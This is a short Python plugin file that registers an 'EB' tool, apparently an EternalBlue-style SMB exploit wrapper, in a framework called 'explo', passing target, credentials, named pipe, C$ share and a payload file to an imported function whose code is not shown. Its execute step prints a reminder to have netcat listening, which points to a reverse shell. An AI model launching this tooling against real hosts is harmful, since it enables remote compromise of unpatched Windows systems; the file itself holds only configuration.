import explo
from .zzz import *


def RegisterTool():
    return {
        "name": "eb",
        "version": "0.1.0",
        "description": "EB tool for explo",
        "uuid": "123e4567-e89b-12d3-a456-426614174000",
        "tags": ["eb", "explo"],
        "vars": {
            "target": "",
            "domain": "",
            "username": "",
            "password": "",
            "remoteName": "",
            "target_ip": "",
            "port": 445,
            "pipe": "lsarpc",
            "share": "C$",
            "mode": "SHARE",
            "payload_file": "",
        },
        "descs": {
            "domain": "Domain name (default: empty)",
            "username": "Username (default: empty)",
            "password": "Password (default: empty)",
            "remoteName": "Remote name (default: empty)",
            "target": "Target IP address can be used instead of remoteName (default: None)",
            "port": "Target port (default: 445)",
        },
        "rootRequired": False,
        "makeCommand": True,
        "shutdown": lambda: explo.info("Shutting down EB tool..."),
        "initialize": lambda: explo.info("Initializing EB tool..."),
        "execute": lambda: print("Make sure nc is listeninig")
        or zzz(
            explo.var("target"),
            explo.var("domain"),
            explo.var("password"),
            explo.var("username"),
            explo.var("remoteName"),
            explo.var("target_ip"),
            explo.var("port"),
            explo.var("pipe"),
            explo.var("share"),
            explo.var("mode"),
            explo.var("payload_file"),
        ),
    }
